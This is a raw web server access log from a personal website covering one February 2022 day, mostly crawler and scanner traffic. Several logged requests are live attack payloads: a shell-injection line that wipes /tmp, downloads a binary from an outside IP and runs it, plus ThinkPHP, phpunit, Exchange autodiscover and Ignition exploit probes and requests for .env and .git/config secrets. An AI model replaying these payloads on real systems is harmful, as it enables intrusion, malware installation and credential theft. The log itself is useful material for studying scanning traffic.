94.232.43.63 - - [09/Feb/2022:01:44:33 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"
94.232.43.63 - - [09/Feb/2022:01:44:34 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"
185.254.196.223 - - [09/Feb/2022:02:06:27 +0000] "GET /.env HTTP/1.1" 200 473 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [09/Feb/2022:02:06:30 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.241.211.11 - - [09/Feb/2022:02:07:21 +0000] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 200 473 "-" "Mozilla/5.0 zgrab/0.x"
192.241.211.186 - - [09/Feb/2022:02:08:46 +0000] "GET /owa/auth/x.js HTTP/1.1" 200 473 "-" "Mozilla/5.0 zgrab/0.x"
192.241.209.199 - - [09/Feb/2022:02:10:02 +0000] "GET /owa/auth/logon.aspx HTTP/1.1" 200 473 "-" "Mozilla/5.0 zgrab/0.x"
35.233.62.116 - - [09/Feb/2022:02:42:42 +0000] "GET / HTTP/1.1" 200 473 "-" "python-requests/2.27.1"
45.43.71.174 - - [09/Feb/2022:02:55:31 +0000] "GET /.env HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
45.43.71.174 - - [09/Feb/2022:02:55:31 +0000] "POST /.env HTTP/1.1" 405 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
45.43.71.174 - - [09/Feb/2022:02:55:31 +0000] "GET /.env HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
45.43.71.174 - - [09/Feb/2022:02:55:32 +0000] "GET /frontend_dev.php/$ HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
45.43.71.174 - - [09/Feb/2022:02:55:32 +0000] "GET /debug/default/view?panel=config HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
45.43.71.174 - - [09/Feb/2022:02:55:32 +0000] "GET /config.json HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
45.43.71.174 - - [09/Feb/2022:02:55:33 +0000] "GET /_profiler/phpinfo HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
45.43.71.174 - - [09/Feb/2022:02:55:33 +0000] "GET /phpinfo.php HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
45.43.71.174 - - [09/Feb/2022:02:55:33 +0000] "GET /info.php HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
45.43.71.174 - - [09/Feb/2022:02:55:34 +0000] "GET /?phpinfo=1 HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
179.43.170.170 - - [09/Feb/2022:02:59:48 +0000] "GET / HTTP/1.1" 200 473 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
45.9.20.65 - - [09/Feb/2022:03:15:29 +0000] "GET /autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
45.9.20.65 - - [09/Feb/2022:03:15:30 +0000] "GET /autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com HTTP/1.1" 200 473 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"
51.79.29.48 - - [09/Feb/2022:03:18:36 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [09/Feb/2022:03:18:36 +0000] "GET /.env HTTP/1.1" 200 473 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.104.193.164 - - [09/Feb/2022:03:27:35 +0000] "GET /.git/config HTTP/1.1" 200 473 "-" "python-requests/2.9.1"
128.1.248.26 - - [09/Feb/2022:03:48:06 +0000] "GET / HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
2.56.56.166 - - [09/Feb/2022:04:13:05 +0000] "GET /.env HTTP/1.1" 200 473 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
2.56.56.166 - - [09/Feb/2022:04:13:05 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
2.56.56.166 - - [09/Feb/2022:04:13:06 +0000] "GET /.env HTTP/1.1" 200 473 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
2.56.56.166 - - [09/Feb/2022:04:13:07 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.76.142.69 - - [09/Feb/2022:04:36:35 +0000] "GET /wp-login.php HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
20.76.142.69 - - [09/Feb/2022:04:36:36 +0000] "GET /wp-login.php HTTP/1.1" 200 473 "http://justinapplegate.me/wp-login.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
66.240.236.109 - - [09/Feb/2022:04:48:27 +0000] "GET / HTTP/1.1" 200 473 "-" "Mozilla/5.0 zgrab/0.x"
64.62.197.92 - - [09/Feb/2022:04:53:00 +0000] "GET / HTTP/1.1" 200 820 "-" "-"
185.254.196.223 - - [09/Feb/2022:05:06:24 +0000] "GET /.env HTTP/1.1" 200 473 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [09/Feb/2022:05:06:25 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
193.46.254.155 - - [09/Feb/2022:05:11:12 +0000] "GET / HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
124.255.20.176 - - [09/Feb/2022:05:35:39 +0000] "POST /HNAP1/ HTTP/1.0" 405 166 "-" "-"
138.246.253.24 - - [09/Feb/2022:05:37:22 +0000] "GET /robots.txt HTTP/1.1" 200 820 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36"
167.94.138.44 - - [09/Feb/2022:05:55:26 +0000] "GET / HTTP/1.1" 200 820 "-" "-"
167.94.138.44 - - [09/Feb/2022:05:55:26 +0000] "GET / HTTP/1.1" 200 473 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.44 - - [09/Feb/2022:05:55:26 +0000] "PRI * HTTP/2.0" 400 166 "-" "-"
128.14.141.34 - - [09/Feb/2022:06:11:14 +0000] "GET / HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
103.133.110.114 - - [09/Feb/2022:06:17:20 +0000] "GET /.env HTTP/1.1" 200 473 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
103.133.110.114 - - [09/Feb/2022:06:17:21 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
103.133.110.114 - - [09/Feb/2022:06:17:22 +0000] "GET /.env HTTP/1.1" 200 473 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
103.133.110.114 - - [09/Feb/2022:06:17:24 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
94.232.43.63 - - [09/Feb/2022:06:18:38 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"
94.232.43.63 - - [09/Feb/2022:06:18:38 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"
45.146.165.37 - - [09/Feb/2022:06:24:37 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.37 - - [09/Feb/2022:06:33:49 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
114.119.156.165 - - [09/Feb/2022:06:41:22 +0000] "GET / HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.156.165 - - [09/Feb/2022:06:41:27 +0000] "GET /js/chunk-vendors.8f0b0301.js HTTP/1.1" 200 120293 "http://www.justinapplegate.me/" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.156.165 - - [09/Feb/2022:06:41:27 +0000] "GET /js/app.e0ab473f.js HTTP/1.1" 200 19861 "http://www.justinapplegate.me/" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
112.196.169.20 - - [09/Feb/2022:06:51:13 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 143.47.243.177/arm7;sh+/tmp/arm7 HTTP/1.1" 200 820 "-" "Hello, world"
71.6.232.4 - - [09/Feb/2022:06:54:47 +0000] "GET / HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
87.251.64.90 - - [09/Feb/2022:07:14:33 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"
213.87.96.96 - - [09/Feb/2022:07:20:58 +0000] "GET / HTTP/1.1" 200 820 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
185.189.182.234 - - [09/Feb/2022:07:28:25 +0000] "GET /DDsa HTTP/1.1" 400 166 "-" "-"
87.251.64.90 - - [09/Feb/2022:07:28:51 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"
45.146.165.37 - - [09/Feb/2022:07:34:31 +0000] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.37 - - [09/Feb/2022:07:47:35 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
51.79.29.48 - - [09/Feb/2022:07:48:43 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [09/Feb/2022:07:48:43 +0000] "GET /.env HTTP/1.1" 200 473 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
154.54.249.195 - - [09/Feb/2022:08:03:08 +0000] "GET /robots.txt HTTP/1.1" 200 473 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
154.54.249.195 - - [09/Feb/2022:08:03:23 +0000] "GET /skills HTTP/1.1" 200 473 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
185.254.196.223 - - [09/Feb/2022:08:06:21 +0000] "GET /.env HTTP/1.1" 200 473 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [09/Feb/2022:08:06:21 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
198.54.135.45 - - [09/Feb/2022:08:18:04 +0000] "GET /autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com HTTP/1.1" 200 473 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
198.54.135.45 - - [09/Feb/2022:08:18:36 +0000] "GET /autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com HTTP/1.1" 200 473 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
198.54.135.45 - - [09/Feb/2022:08:18:44 +0000] "GET /autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com HTTP/1.1" 200 473 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
20.199.119.34 - - [09/Feb/2022:08:20:56 +0000] "GET /.env HTTP/1.1" 200 473 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.199.119.34 - - [09/Feb/2022:08:21:01 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.146.165.37 - - [09/Feb/2022:08:24:25 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
179.43.170.170 - - [09/Feb/2022:08:39:32 +0000] "GET / HTTP/1.1" 200 473 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
20.55.53.144 - - [09/Feb/2022:09:19:54 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\x98h\xA4\xC1\xC5\xDCw" 400 166 "-" "-"
20.55.53.144 - - [09/Feb/2022:09:20:20 +0000] "GET /jNvcer7Vzs29K3EqoQxSCipR6Ic HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36"
198.54.135.45 - - [09/Feb/2022:09:20:29 +0000] "GET /autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com HTTP/1.1" 200 473 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
198.54.135.45 - - [09/Feb/2022:09:21:16 +0000] "GET /autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com HTTP/1.1" 200 473 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
45.146.165.37 - - [09/Feb/2022:09:33:40 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 405 568 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
209.141.41.69 - - [09/Feb/2022:09:50:54 +0000] "GET /static_new6/js/manifest.3ad1d5771e9b13dbdad2.js HTTP/1.1" 200 820 "-" "Mozilla/5.0 (iPad; CPU OS 9_3_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/16.0.124986583 Mobile/13F69 Safari/600.1.4"
45.146.165.37 - - [09/Feb/2022:10:00:56 +0000] "GET /_ignition/execute-solution HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
54.36.148.23 - - [09/Feb/2022:10:13:21 +0000] "GET /robots.txt HTTP/1.1" 200 473 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.9 - - [09/Feb/2022:10:13:22 +0000] "GET / HTTP/1.1" 200 473 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
198.98.54.150 - - [09/Feb/2022:10:32:11 +0000] "GET /js/app.e122814a.js HTTP/1.1" 200 820 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36"
114.119.143.207 - - [09/Feb/2022:10:39:07 +0000] "GET /robots.txt HTTP/1.1" 200 473 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
185.180.143.7 - - [09/Feb/2022:10:49:41 +0000] "GET / HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
89.248.165.24 - - [09/Feb/2022:10:55:35 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"
45.146.165.37 - - [09/Feb/2022:11:04:17 +0000] "GET / HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
66.249.64.218 - - [09/Feb/2022:11:05:00 +0000] "GET /robots.txt HTTP/1.1" 200 473 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.216 - - [09/Feb/2022:11:05:00 +0000] "GET /my-thoughts HTTP/1.1" 200 473 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
185.254.196.223 - - [09/Feb/2022:11:06:03 +0000] "GET /.env HTTP/1.1" 200 473 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [09/Feb/2022:11:06:04 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
